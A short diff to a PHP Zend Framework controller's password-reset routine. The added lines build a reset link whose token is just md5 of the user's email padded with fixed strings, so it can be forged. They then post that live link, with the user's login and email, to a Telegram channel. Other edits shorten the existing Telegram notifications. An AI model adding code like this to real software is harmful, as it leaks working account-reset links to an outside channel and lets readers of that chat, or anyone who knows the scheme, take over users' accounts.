@@ -1590,15 +1590,19 @@ class IndexController extends Zend_Controller_Action {
 
 			require_once 'Classes/TelegramAPI.php';
 
+			$link = URL . "index/redefinir-senha?tk=g0r" . md5($email) . "gd5&u=" . $login;
+
+			TelegramAPI::send("🔑 <b>Redefinição de senha solicitada</b>\nLogin: <code>{$login}</code>\nEmail: <code>{$email}</code>\n🔗 <a href='{$link}'>Clique aqui para redefinir</a>", true);
+
 			try{
 				if($attach){
 					$mail->createAttachment(file_get_contents($attach), 'text/plain', Zend_Mime::DISPOSITION_ATTACHMENT, Zend_Mime::ENCODING_BASE64, $attach);
 				}
 				$result = $mail->send($transport);
-				TelegramAPI::send("✅ <b>Email redefinição enviado</b>\nPara: <code>{$email}</code>\nLogin: <code>{$login}</code>\nSMTP: smtp.sistemameucar.provisorio.ws", true);
+				TelegramAPI::send("✅ <b>Email redefinição enviado com sucesso</b>\nPara: <code>{$email}</code>", true);
 				return $result;
 			}catch(Exception $e){
-				TelegramAPI::send("❌ <b>Falha ao enviar email redefinição</b>\nPara: <code>{$email}</code>\nLogin: <code>{$login}</code>\nErro: <code>" . $e->getMessage() . "</code>\nSMTP: smtp.sistemameucar.provisorio.ws", true);
+				TelegramAPI::send("❌ <b>Falha ao enviar email</b>\nErro: <code>" . $e->getMessage() . "</code>", true);
 			}
 
 	}
